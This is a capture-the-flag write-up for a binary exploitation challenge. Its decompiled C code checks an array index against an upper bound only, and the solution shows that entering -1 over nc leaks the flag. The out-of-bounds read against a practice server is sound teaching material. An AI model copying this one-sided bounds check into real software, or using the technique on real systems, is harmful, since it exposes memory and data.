# Whats behind door zero

Category: Binary Exploitation, 250 points

# Description

> Sometimes we need to look **backwards** for answers

The program expects a certain kind of input.
The program only checks bounds **one way**.

The disassembled ELF

```

bool main(void)

{
  uint uVar1;
  long in_FS_OFFSET;
  uint local_4c;
  undefined8 local_48;
  char *local_40 [4];
  undefined *local_20;
  undefined *local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_48 = initialize();
  local_40[0] = "I";
  local_40[1] = &DAT_0040200a;
  local_40[2] = "hacking";
  local_40[3] = &DAT_00402017;
  local_20 = &DAT_0040201b;
  local_18 = &DAT_0040201f;
  printf("%s","From which index do you wish to read?\nEnter a number: ");
  __isoc99_scanf(&DAT_00402062,&local_4c);
  uVar1 = local_4c;
  if ((int)local_4c < 0x15) {
    printf("Printing the string at index: %d\n",(ulong)local_4c);
    puts(local_40[(int)local_4c]);
  }
  else {
    puts("That index is out of bounds. Maybe try looking in a different direction...");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0x14 < (int)uVar1;
}

```

# Solution

They give us the initial hint that the values given as input are only checked in one direction.

Looking at the disassembled ELF we can see that the **upper bound is only checked**.

Thus we can attempt to input bounds going backwards from **0**.

If we connect to the server and give it the value of -1 to access out of the array we get the flag

```
nc cmgr.c3t.eecs.net 21395

From which index do you wish to read?

Enter a number: -1

Printing the string at index: -1

c3t{neg4t1ve_numb3r5_4r3_c00l4rj5pg7t}
```







 

